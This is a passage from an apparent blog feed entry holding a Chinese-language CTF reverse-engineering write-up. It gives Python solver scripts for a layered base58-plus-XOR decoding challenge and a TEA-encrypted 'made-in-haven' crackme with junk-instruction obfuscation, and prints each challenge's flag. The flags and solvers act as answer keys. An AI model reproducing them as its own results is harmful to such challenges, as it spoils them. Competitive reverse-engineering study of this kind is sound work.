class="string">&quot;Cqp3uLCDnuU4GwD1kKet8Bmqb4eidPWEcr6bSNNU3wr5xxtHpc43TyHMSKggBRZr&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">b58decode</span>(<span class="params">s: <span class="built_in">str</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">    num = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> ch <span class="keyword">in</span> s:</span><br><span class="line">        num = num * <span class="number">58</span> + value_map[ch]</span><br><span class="line">    out = <span class="built_in">bytearray</span>()</span><br><span class="line">    <span class="keyword">while</span> num:</span><br><span class="line">        num, rem = <span class="built_in">divmod</span>(num, <span class="number">256</span>)</span><br><span class="line">        out.append(rem)</span><br><span class="line">    out.reverse()</span><br><span class="line">    leading = <span class="built_in">len</span>(s) - <span class="built_in">len</span>(s.lstrip(<span class="string">&quot;1&quot;</span>))</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>([<span class="number">0</span>] * leading) + <span class="built_in">bytes</span>(out)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">layer = target</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">    decoded = b58decode(layer)</span><br><span class="line">    <span class="keyword">if</span> i &lt; <span class="number">4</span>:</span><br><span class="line">        layer = decoded.decode(<span class="string">&quot;ascii&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        original = decoded</span><br><span class="line"></span><br><span class="line">flag = <span class="built_in">bytes</span>(b ^ <span class="number">0x66</span> <span class="keyword">for</span> b <span class="keyword">in</span> original).decode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><p>susctf{Oh_My_G0d_You_@re_Rev3rse_God!!!}</p><h3 id="made-in-haven"><a href="#made-in-haven" class="headerlink" title="made-in-haven"></a>made-in-haven</h3><p>看到haven就想到了dubhectf做的一道天堂之门的题目…</p><p>看了下附件有很多retn和花指令混淆，都path掉再F5就可以得到主逻辑</p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251007095901048.png" alt="image-20251007095901048"></p><p>先对key前8位和后8位做xor和sub</p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251007100352051.png" alt="image-20251007100352051"></p><p>然后一个简单的TEA即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64, struct</span><br><span class="line"></span><br><span class="line">TWEAK_XOR = [<span class="number">0x01</span>, <span class="number">0x09</span>, <span class="number">0x02</span>, <span class="number">0x06</span>, <span class="number">0x00</span>, <span class="number">0x08</span>, <span class="number">0x01</span>, <span class="number">0x07</span>]</span><br><span class="line">TWEAK_SUB = [<span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x02</span>, <span class="number">0x05</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>]</span><br><span class="line">KEY_SEED = <span class="built_in">bytearray</span>(<span class="string">b&#x27;elgvdislhapybsy&quot;&#x27;</span>)</span><br><span class="line">CIPHER = <span class="built_in">bytes</span>.fromhex(<span class="string">&quot;6f470a56d13abcf8e393c2a6118f0b6ff77da5815732b3f5618570a0e19339ec&quot;</span>)</span><br><span class="line">DELTA = <span class="number">0xDEADBEEF</span></span><br><span class="line">ROUNDS = <span class="number">32</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">len</span>(KEY_SEED) == <span class="number">16</span></span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">len</span>(TWEAK_XOR) &gt;= <span class="number">8</span> <span class="keyword">and</span> <span class="built_in">len</span>(TWEAK_SUB) &gt;= <span class="number">8</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Phase 1 (xor-type)</span></span><br><span class="line"><span class="keyword">for</span> i, tweak <span class="keyword">in</span> <span class="built_in">enumerate</span>(TWEAK_XOR[:<span class="number">8</span>]):</span><br><span class="line">    t = (tweak) &amp; <span class="number">0xFF</span></span><br><span class="line">    KEY_SEED[i] = ((KEY_SEED[i] ^ t) ) &amp; <span class="number">0xFF</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Phase 2 (sub-type) — simplified equivalence: ((* - (b-1)) - 1) == (* - b)</span></span><br><span class="line"><span class="keyword">for</span> i, tweak <span class="keyword">in</span> <span class="built_in">enumerate</span>(TWEAK_SUB[:<span class="number">8</span>]):</span><br><span class="line">    KEY_SEED[<span class="number">8</span> + i] = (KEY_SEED[<span class="number">8</span> + i] - (tweak &amp; <span class="number">0xFF</span>)) &amp; <span class="number">0xFF</span></span><br><span class="line"></span><br><span class="line">KEY = struct.unpack(<span class="string">&quot;&lt;4I&quot;</span>, <span class="built_in">bytes</span>(KEY_SEED))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tea_decrypt_block</span>(<span class="params">v0, v1</span>):</span><br><span class="line">    total = (DELTA * ROUNDS) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(ROUNDS):</span><br><span class="line">        v1 = (v1 - (((v0 &lt;&lt; <span class="number">4</span>) + KEY[<span class="number">2</span>]) ^ (v0 + total) ^ ((v0 &gt;&gt; <span class="number">5</span>) + KEY[<span class="number">3</span>]))) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">        v0 = (v0 - (((v1 &lt;&lt; <span class="number">4</span>) + KEY[<span class="number">0</span>]) ^ (v1 + total) ^ ((v1 &gt;&gt; <span class="number">5</span>) + KEY[<span class="number">1</span>]))) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">        total = (total - DELTA) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">    <span class="keyword">return</span> v0, v1</span><br><span class="line"></span><br><span class="line">flag = <span class="built_in">bytearray</span>()</span><br><span class="line"><span class="keyword">for</span> off <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(CIPHER), <span class="number">8</span>):</span><br><span class="line">    block = struct.unpack(<span class="string">&quot;&lt;2I&quot;</span>, CIPHER[off:off + <span class="number">8</span>])</span><br><span class="line">    flag += struct.pack(<span class="string">&quot;&lt;2I&quot;</span>, *tea_decrypt_block(*block))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>( <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">chr</span>(b) <span class="keyword">if</span> <span class="number">32</span>&lt;=b&lt;=<span class="number">126</span> <span class="keyword">else</span> <span class="string">&#x27;.&#x27;</span> <span class="keyword">for</span> b <span class="keyword">in</span> flag))</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>susctf{sp33d_up_time_t0_h34v3n!}</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;SUSCTF-wp&quot;&gt;&lt;a href=&quot;#SUSCTF-wp&quot; class=&quot;headerlink&quot; title=&quot;SUSCTF wp&quot;&gt;&lt;/a&gt;SUSCTF wp&lt;/h1&gt;&lt;p&gt;&lt;img src=&quot;https://luhaoblog.oss-cn-hangzho</summary>
      
    
    
    
    <category term="CTF wp" scheme="http://matriy330.github.io/categories/CTF-wp/"/>
    
    
    <category term="wp" scheme="http://matriy330.github.io/tags/wp/"/>
    
  </entry>
  
</feed>
